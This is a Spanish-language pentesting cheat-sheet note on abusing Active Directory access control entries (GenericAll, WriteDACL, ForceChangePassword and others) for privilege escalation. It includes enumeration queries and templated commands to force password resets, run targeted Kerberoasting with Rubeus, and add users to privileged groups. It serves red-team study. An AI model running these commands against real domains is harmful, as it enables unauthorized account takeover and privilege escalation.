---
aliases:
  - ACL Abuse
tags:
  - asset/active-directory
  - technique/privilege-escalation
kind: Technique
linked:
  - "[[AD - ACL Enumeration]]"
  - "[[AD - ACL Enumeration - Dangerous ACE Patterns]]"
  - "[[BloodHound & SharpHound]]"
---
# ACL Abuse

> [!info]
> Abuso de ACEs (Access Control Entries) en AD para escalar privilegios o tomar control de objetos. BloodHound es la herramienta principal para mapear edges abusables.

---

## ACEs peligrosos (orden de impacto)

| ACE | Vector |
|---|---|
| **GenericAll** | Control total — reset pwd, add SPN, write attribs |
| **GenericWrite** | Write attributes — abuse SPN/`servicePrincipalName` para Kerberoast forzado |
| **WriteDACL** | Modificar ACL → grant yourself GenericAll |
| **WriteOwner** | Tomar ownership → modificar DACL |
| **AllExtendedRights** | DCSync, password reset, etc. |
| **ForceChangePassword** | Reset password sin conocer la actual |
| **AddMember** (sobre grupo) | Auto-añadirse al grupo |
| **AddKeyCredentialLink** | Shadow Credentials (PKI) |
| **GetChanges + GetChangesAll** | DCSync |

---

## Discovery

```bash
# BloodHound: edges peligrosos hacia tu user
MATCH p=shortestPath((u:User {name:"YOU@DOMAIN"})-[*1..]->(t)) RETURN p

# PowerView local enum
Get-DomainObjectAcl -Identity <target> -ResolveGUIDs

# Impacket
findDelegation.py -dc-ip <DC> <DOMAIN>/<USER>
```

Ver [[AD - ACL Enumeration]] para detalles.

---

## Explotación común

### Reset password (ForceChangePassword)
```bash
# Linux
net rpc password "<victim>" "NewPass123!" -U "<DOMAIN>"/"<USER>"%"<PASS>" -S <DC>

# Windows
Set-DomainUserPassword -Identity <victim> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

### Targeted Kerberoasting (GenericWrite)
```bash
# Set SPN en victima, kerberoast, remove SPN
Set-DomainObject -Identity <victim> -Set @{serviceprincipalname='kerberoast/test'}
Rubeus.exe kerberoast /user:<victim>
Set-DomainObject -Identity <victim> -Clear serviceprincipalname
```

### DCSync (DS-Replication-Get-Changes-All)
- Ver [[DCSync]].

### Shadow Credentials (AddKeyCredentialLink)
- Ver [[Shadow Credentials]].

### Group nesting (AddMember)
```bash
net rpc group addmem "<priv-group>" "<your-user>" -U "<DOMAIN>"/"<USER>"%"<PASS>" -S <DC>
```

---

## Notas Relacionadas

- [[AD - ACL Enumeration]]
- [[AD - ACL Enumeration - Dangerous ACE Patterns]]
- [[BloodHound & SharpHound]]
- [[DCSync]]
- [[Shadow Credentials]]
- [[Kerberoasting]]
